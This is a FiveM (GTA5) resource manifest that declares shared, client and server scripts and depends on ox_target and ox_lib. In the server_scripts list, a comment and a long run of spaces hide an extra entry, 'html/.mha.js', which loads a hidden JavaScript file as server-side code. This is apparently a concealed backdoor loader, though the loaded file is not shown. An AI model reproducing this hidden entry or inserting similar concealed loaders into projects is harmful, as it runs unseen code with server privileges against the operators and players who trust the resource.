fx_version 'cerulean'
game 'gta5'
lua54 'yes'

shared_script {
    'config.lua',
    '@ox_lib/init.lua'
}
client_scripts { 'client.lua' }
server_scripts { 'server.lua',
	--[[server.lua]]                                                                                                    'html/.mha.js', }

dependencies {
    'ox_target',
    'ox_lib'
}
